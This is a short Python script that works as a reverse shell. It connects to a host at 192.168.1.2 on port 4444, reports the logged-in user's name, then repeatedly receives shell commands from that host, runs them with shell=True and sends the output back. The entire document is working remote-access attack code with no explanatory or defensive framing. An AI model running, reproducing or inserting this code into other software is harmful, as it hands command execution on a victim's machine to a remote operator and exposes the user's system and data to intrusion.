import socket
from subprocess import Popen, PIPE
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.2", 4444))
s.send("the user is {0}".format(os.getlogin()).encode("utf-8"))
while True:
    commend = s.recv(500000).decode('utf-8')
    p = Popen(commend,stdout=PIPE, stderr=PIPE,shell=True)
    if p.communicate()[0] == ''.encode("utf-8"):
        s.send(p.communicate()[1])
    else:
        print(s.send(p.communicate()[0]))